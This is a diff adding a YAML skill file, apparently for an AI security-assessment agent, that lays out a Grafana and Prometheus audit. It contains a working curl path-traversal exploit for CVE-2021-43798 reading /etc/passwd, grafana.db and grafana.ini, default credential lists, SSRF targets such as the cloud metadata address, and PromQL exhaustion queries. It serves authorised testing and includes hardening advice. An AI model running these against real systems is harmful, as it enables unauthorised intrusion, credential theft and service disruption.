@@ -1,0 +1,99 @@
+schema_version: 1
+version: 3.0.0
+name: grafana-prometheus-audit
+description: >
+  Comprehensive Grafana and Prometheus monitoring stack security assessment. Covers Grafana directory
+  traversal (CVE-2021-43798), snapshot data leakage, default administrative credentials, datasource SSRF,
+  Prometheus metrics credential harvesting, PromQL query injection, and Alertmanager webhook abuse.
+triggers:
+  - grafana
+  - prometheus
+  - cve-2021-43798
+  - promql
+  - alertmanager
+  - node_exporter
+  - metrics
+  - grafana datasource
+  - monitoring security
+  - metrics scraping
+tools:
+  - curl
+  - httpx
+  - python3
+knowledge: |
+  Monitoring and telemetry stacks (Grafana, Prometheus, Alertmanager, Node Exporter) are frequently
+  exposed on internal networks or development subdomains without adequate authentication.
+  They aggregate environment variables, database connections, cloud credentials, and internal topology.
+
+  1. SURFACE MAPPING & FINGERPRINTING:
+     Default ports:
+       - Grafana: 3000
+       - Prometheus: 9090
+       - Alertmanager: 9093
+       - Node Exporter: 9100
+     Fingerprint with httpx:
+       httpx -u https://target -path /login,/api/health,/api/v1/query,/metrics -mc 200,302 -title
+     Grafana version detection:
+       curl -s -I "https://target:3000/login" | grep -i "x-grafana"
+       curl -s "https://target:3000/api/health"
+
+  2. GRAFANA DIRECTORY TRAVERSAL (CVE-2021-43798 & PLUGIN TRAVERSAL):
+     Vulnerable versions (8.0.0-beta1 to 8.3.0) permit unauthenticated path traversal via installed plugins:
+     Plugin path traversal test:
+       curl -s --path-as-is "http://target:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"
+     Target high-value files:
+       - /public/plugins/welcome/../../../../../../../../etc/passwd
+       - /public/plugins/text/../../../../../../../../etc/hosts
+       - /public/plugins/graph/../../../../../../../../var/lib/grafana/grafana.db (SQLite database with creds)
+       - /public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini (LDAP/OAuth secrets)
+
+  3. GRAFANA AUTHENTICATION & CREDENTIAL TESTING:
+     Default accounts: admin:admin, admin:password, admin:grafana, guest:guest
+     Unauthenticated access paths:
+       - Anonymous access enabled: GET /api/org/users, GET /api/datasources
+       - Public dashboard snapshot leaks: GET /api/snapshots (contains recorded metric data)
+       - Leaked API keys in frontend JS: search for "Bearer glsa_" or "Bearer eyJ"
+
+  4. DATASOURCE SSRF VIA PROXY ENDPOINT:
+     Grafana acts as proxy to underlying databases (Prometheus, InfluxDB, ElasticSearch, MySQL):
+       POST /api/datasources/proxy/<id>/...
+     If operator has editor or admin rights:
+       Configure new datasource pointing to internal resources:
+         - AWS Metadata: http://169.254.169.254/latest/meta-data/
+         - Internal Kubernetes API: https://kubernetes.default.svc/
+         - Local Redis/MySQL: http://127.0.0.1:6379
+
+  5. PROMETHEUS METRICS SCRAPING & CREDENTIAL HARVESTING:
+     Endpoint: http://target:9090/api/v1/query or /metrics
+     Search for environment variables, secrets, and connection strings exposed in metric labels:
+       PromQL queries:
+         - scrape_duration_seconds
+         - process_cmdline (often contains passwords passed via CLI arguments)
+         - go_info, node_uname_info (OS, kernel version)
+         - redis_connected_clients, mysql_global_status_threads_connected
+     Node Exporter (/metrics on 9100):
+       curl -s "http://target:9100/metrics" | grep -E "node_network_|node_cpu_|node_disk_"
+       Reveals full internal network interfaces, mount points, and host specs.
+
+  6. PROMQL INJECTION & RESOURCE EXHAUSTION:
+     Where web applications pass user input into PromQL query strings:
+       Probe with PromQL arithmetic and regex filters:
+         {__name__=~".*"} (forces retrieval of all metrics in memory)
+         count(count by (__name__) ({__name__=~".*"})) (heavy aggregation DOS test)
+
+  7. ALERTMANAGER WEBHOOK EXPLOITATION:
+     Endpoint: http://target:9093/api/v2/alerts
+     - Unauthenticated webhook dispatch: inject fake alerts triggering external webhook callbacks.
+     - Webhook receiver URL extraction from /api/v2/status: reveals internal Slack/Teams/PagerDuty webhooks.
+
+  REMEDIATION & HARDENING GUIDANCE:
+     - Upgrade Grafana to latest LTS; ensure CVE-2021-43798 patches are verified.
+     - Restrict Prometheus :9090 and Node Exporter :9100 to private management networks only.
+     - Disable anonymous authentication in grafana.ini (auth.anonymous.enabled = false).
+references:
+  - https://grafana.com/blog/2021/12/08/an-update-on-0day-cve-2021-43798/
+  - https://prometheus.io/docs/prometheus/latest/querying/api/
+  - https://attack.mitre.org/techniques/T1552/001/
+provenance:
+  origin: builtin
+  source: persona/v0.1/skills/grafana-prometheus-audit.yaml
